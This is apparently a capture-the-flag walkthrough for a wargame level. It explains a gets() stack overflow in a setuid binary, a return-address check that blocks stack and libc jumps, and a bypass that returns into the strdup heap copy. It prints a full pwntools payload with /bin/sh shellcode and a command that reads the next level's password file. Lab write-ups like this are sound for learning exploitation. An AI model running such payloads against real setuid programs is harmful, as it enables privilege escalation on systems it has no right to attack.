level2 - walkthrough
====================

Target: /home/user/level2/level2   (setuid + setgid level3)
Goal:   read /home/user/level3/.pass

1. The bug
   p() reads with gets() (overflow), but before returning it inspects its own
   saved return address:

     mov 0x4(%ebp),%eax   ; eax = saved return address
     mov %eax,-0xc(%ebp)  ; ALSO stores it into buf+64  <-- matters later
     and $0xb0000000,%eax
     cmp $0xb0000000,%eax ; if addr in 0xb0000000..0xbfffffff -> reject & exit

   That check rejects the stack (0xbfff_xxxx) and libc (0xb7xx_xxxx), so we can
   neither jump to shellcode in our own buffer nor ret2libc.

2. The way in: the heap
   Just before returning, p() calls strdup(buf), copying our input to the heap
   at 0x0804a008. A heap address is low (0x0804_xxxx), so it passes the check.
   ASLR is off, so 0x0804a008 is stable. We overwrite the saved return address
   with 0x0804a008 and return into the heap copy of our own input.

3. The self-corruption catch
   `mov %eax,-0xc(%ebp)` writes the return address we chose (0x0804a008) into
   buf+64, so bytes 64..67 of the heap copy are clobbered. We start the copy
   with `jmp $+84` (eb 52) to hop over that region to clean shellcode placed
   after the return-address slot. Offsets: saved EIP at 80, shellcode at 84.

4. Payload  (Ressources/exploit.py)
     payload  = asm("jmp $+84")          # eb 52  -> lands at offset 84
     payload += b"A"*78                   # padding (byte 64..67 clobbered here)
     payload += p32(0x804a008)            # saved EIP -> heap copy
     payload += asm(shellcraft.i386.sh()) # 44-byte /bin/sh shellcode (NUL-free)

5. Run
     $ python3 Ressources/exploit.py
     $ (cat payload; printf '\n'; sleep 1; echo 'cat /home/user/level3/.pass') | ./level2
   The shellcode execve's /bin/sh; execve discards the stdio buffer, so the
   command left in the pipe (after the pause) is read by that fresh shell.

